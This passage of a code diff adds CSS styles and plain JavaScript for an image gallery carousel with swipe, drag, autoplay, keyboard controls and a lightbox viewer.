+  transition: background 0.3s ease, transform 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.saber-lightbox-close:hover {
+  background: rgba(255, 255, 255, 0.3);
+  transform: rotate(90deg);
+}
+.saber-lightbox-arrow {
+  position: absolute;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 50px;
+  height: 50px;
+  border: none;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.15);
+  color: #fff;
+  font-size: 20px;
+  cursor: pointer;
+  z-index: 3;
+  transition: background 0.3s ease, opacity 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.saber-lightbox-arrow:hover {
+  background: rgba(255, 255, 255, 0.3);
+}
+.saber-lightbox-arrow.disabled {
+  opacity: 0.2;
+  cursor: not-allowed;
+}
+.saber-lightbox-prev {
+  left: 20px;
+}
+.saber-lightbox-next {
+  right: 20px;
+}
+.saber-lightbox-counter {
+  position: absolute;
+  bottom: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  color: rgba(255, 255, 255, 0.8);
+  font-size: 14px;
+  z-index: 3;
+  letter-spacing: 2px;
+}
+
+@media (max-width: 768px) {
+  .saber-lightbox-arrow {
+    width: 40px;
+    height: 40px;
+    font-size: 16px;
+  }
+  .saber-lightbox-prev {
+    left: 10px;
+  }
+  .saber-lightbox-next {
+    right: 10px;
+  }
+  .saber-lightbox-close {
+    top: 10px;
+    right: 15px;
+    width: 36px;
+    height: 36px;
+    font-size: 16px;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Gallery Logic
+  var container = document.getElementById('saberGallery');
+  var track = container.querySelector('.saber-gallery-track');
+  var images = container.querySelectorAll('.saber-gallery-img');
+  var dots = container.querySelectorAll('.saber-gallery-dot');
+  var prevBtn = document.getElementById('saberPrev');
+  var nextBtn = document.getElementById('saberNext');
+  var current = 0;
+  var total = images.length;
+  var autoInterval = 15000;
+  var timer = null;
+
+  function goTo(index) {
+    if (index < 0) index = 0;
+    if (index >= total) index = total - 1;
+    current = index;
+    track.style.transform = 'translateX(-' + (current * 100) + '%)';
+    dots.forEach(function(dot, i) {
+      dot.classList.toggle('active', i === current);
+    });
+    updateArrows();
+  }
+
+  function updateArrows() {
+    prevBtn.classList.toggle('disabled', current === 0);
+    nextBtn.classList.toggle('disabled', current === total - 1);
+  }
+
+  function next() {
+    if (current < total - 1) {
+      goTo(current + 1);
+    }
+  }
+
+  function prev() {
+    if (current > 0) {
+      goTo(current - 1);
+    }
+  }
+
+  function startAuto() {
+    timer = setInterval(function() {
+      if (current < total - 1) {
+        goTo(current + 1);
+      } else {
+        goTo(0);
+      }
+    }, autoInterval);
+  }
+
+  function stopAuto() {
+    clearInterval(timer);
+  }
+
+  prevBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    stopAuto();
+    prev();
+    startAuto();
+  });
+
+  nextBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    stopAuto();
+    next();
+    startAuto();
+  });
+
+  dots.forEach(function(dot, i) {
+    dot.addEventListener('click', function(e) {
+      e.stopPropagation();
+      stopAuto();
+      goTo(i);
+      startAuto();
+    });
+  });
+
+  // Touch swipe support
+  var startX = 0;
+  var startY = 0;
+  var isDragging = false;
+  var currentTranslate = 0;
+  var prevTranslate = 0;
+
+  container.addEventListener('touchstart', function(e) {
+    startX = e.touches[0].clientX;
+    startY = e.touches[0].clientY;
+    isDragging = true;
+    stopAuto();
+    track.style.transition = 'none';
+  }, { passive: true });
+
+  container.addEventListener('touchmove', function(e) {
+    if (!isDragging) return;
+    var diffX = e.touches[0].clientX - startX;
+    var diffY = e.touches[0].clientY - startY;
+    if (Math.abs(diffX) > Math.abs(diffY)) {
+      currentTranslate = prevTranslate + diffX;
+      track.style.transform = 'translateX(' + currentTranslate + 'px)';
+    }
+  }, { passive: true });
+
+  container.addEventListener('touchend', function(e) {
+    if (!isDragging) return;
+    isDragging = false;
+    track.style.transition = 'transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
+    var diffX = e.changedTouches[0].clientX - startX;
+    if (Math.abs(diffX) > 50) {
+      if (diffX > 0 && current > 0) {
+        prev();
+      } else if (diffX < 0 && current < total - 1) {
+        next();
+      } else {
+        goTo(current);
+      }
+    } else {
+      goTo(current);
+    }
+    prevTranslate = -(current * container.offsetWidth);
+    startAuto();
+  });
+
+  // Mouse drag support
+  var mouseDown = false;
+  container.addEventListener('mousedown', function(e) {
+    mouseDown = true;
+    startX = e.clientX;
+    stopAuto();
+    track.style.transition = 'none';
+    e.preventDefault();
+  });
+
+  container.addEventListener('mousemove', function(e) {
+    if (!mouseDown) return;
+    var diffX = e.clientX - startX;
+    currentTranslate = prevTranslate + diffX;
+    track.style.transform = 'translateX(' + currentTranslate + 'px)';
+  });
+
+  container.addEventListener('mouseup', function(e) {
+    if (!mouseDown) return;
+    mouseDown = false;
+    track.style.transition = 'transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
+    var diffX = e.clientX - startX;
+    if (Math.abs(diffX) > 50) {
+      if (diffX > 0 && current > 0) {
+        prev();
+      } else if (diffX < 0 && current < total - 1) {
+        next();
+      } else {
+        goTo(current);
+      }
+    } else {
+      goTo(current);
+    }
+    prevTranslate = -(current * container.offsetWidth);
+    startAuto();
+  });
+
+  container.addEventListener('mouseleave', function() {
+    if (mouseDown) {
+      mouseDown = false;
+      track.style.transition = 'transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
+      goTo(current);
+      prevTranslate = -(current * container.offsetWidth);
+      startAuto();
+    }
+  });
+
+  window.addEventListener('resize', function() {
+    prevTranslate = -(current * container.offsetWidth);
+  });
+
+  // Lightbox Logic
+  var lightbox = document.getElementById('saberLightbox');
+  var lightboxImg = document.getElementById('saberLightboxImg');
+  var lightboxClose = document.getElementById('saberLightboxClose');
+  var lightboxPrevBtn = document.getElementById('saberLightboxPrev');
+  var lightboxNextBtn = document.getElementById('saberLightboxNext');
+  var lightboxCounter = document.getElementById('saberLightboxCounter');
+  var lightboxOverlay = lightbox.querySelector('.saber-lightbox-overlay');
+  var lightboxCurrent = 0;
+  var imgSources = Array.from(images).map(function(img) { return img.src; });
+
+  function openLightbox(index) {
+    lightboxCurrent = index;
+    lightboxImg.src = imgSources[lightboxCurrent];
+    updateLightboxCounter();
+    updateLightboxArrows();
+    lightbox.style.display = 'flex';
+    document.body.style.overflow = 'hidden';
+    // Force reflow
+    lightbox.offsetHeight;
+    lightbox.classList.add('active');
+    stopAuto();
+  }
+
+  function closeLightbox() {
+    lightbox.classList.remove('active');
+    document.body.style.overflow = '';
+    setTimeout(function() {
+      lightbox.style.display = 'none';
+      lightboxImg.src = '';
+      startAuto();
+    }, 300);
+  }
+
+  function updateLightboxCounter() {
+    lightboxCounter.textContent = (lightboxCurrent + 1) + ' / ' + total;
+  }
+
+  function updateLightboxArrows() {
+    lightboxPrevBtn.classList.toggle('disabled', lightboxCurrent === 0);
+    lightboxNextBtn.classList.toggle('disabled', lightboxCurrent === total - 1);
+  }
+
+  function lightboxGoTo(index) {
+    if (index < 0 || index >= total) return;
+    lightboxCurrent = index;
+    lightboxImg.style.opacity = '0.5';
+    setTimeout(function() {
+      lightboxImg.src = imgSources[lightboxCurrent];
+      lightboxImg.style.opacity = '1';
+      updateLightboxCounter();
+      updateLightboxArrows();
+    }, 150);
+  }
+
+  function lightboxNext() {
+    if (lightboxCurrent < total - 1) {
+      lightboxGoTo(lightboxCurrent + 1);
+    }
+  }
+
+  function lightboxPrev() {
+    if (lightboxCurrent > 0) {
+      lightboxGoTo(lightboxCurrent - 1);
+    }
+  }
+
+  // Click on gallery image to open lightbox
+  container.addEventListener('click', function(e) {
+    if (e.target.closest('.saber-gallery-arrow') || e.target.closest('.saber-gallery-dots')) return;
+    openLightbox(current);
+  });
+
+  lightboxClose.addEventListener('click', closeLightbox);
+  lightboxOverlay.addEventListener('click', closeLightbox);
+
+  lightboxPrevBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    lightboxPrev();
+  });
+
+  lightboxNextBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    lightboxNext();
+  });
+
+  // Keyboard navigation
+  document.addEventListener('keydown', function(e) {
+    if (!lightbox.classList.contains('active')) return;
+    if (e.key === 'Escape') {
+      closeLightbox();
+    } else if (e.key === 'ArrowLeft') {
+      lightboxPrev();
+    } else if (e.key === 'ArrowRight') {
+      lightboxNext();
+    }
+  });
+
+  // Swipe in lightbox
+  var lbStartX = 0;
+  lightbox.addEventListener('touchstart', function(e) {
+    lbStartX = e.touches[0].clientX;
+  }, { passive: true });
+
+  lightbox.addEventListener('touchend', function(e) {
+    var diffX = e.changedTouches[0].clientX - lbStartX;
+    if (Math.abs(diffX) > 80) {
+      if (diffX > 0) {
+        lightboxPrev();
+      } else {
+        lightboxNext();
+      }
+    }
+  }, { passive: true });
+
+  // Initialize
+  prevTranslate = 0;
+  updateArrows();
+  startAuto();
+})();
+</script>
 
       </div>
 
